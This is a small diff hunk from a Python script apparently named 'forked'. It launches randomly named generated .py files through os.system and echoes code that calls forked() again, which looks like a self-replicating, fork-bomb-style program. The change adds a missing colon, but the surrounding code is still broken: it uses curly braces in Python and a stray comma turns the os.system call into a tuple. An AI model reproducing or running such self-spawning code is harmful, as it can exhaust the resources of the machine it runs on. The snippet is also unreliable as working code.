@@ -46,7 +46,7 @@ def forked():
     """)
   os.system("python " + "fucked" + random1 + str(random2) + str(random3) + str(random4) + ".py")
   file = "end.py"
-  if (os.path.exists(file))
+  if (os.path.exists(file)):
   {
     os.system,('''echo 'from forked import forked
     forked()''')
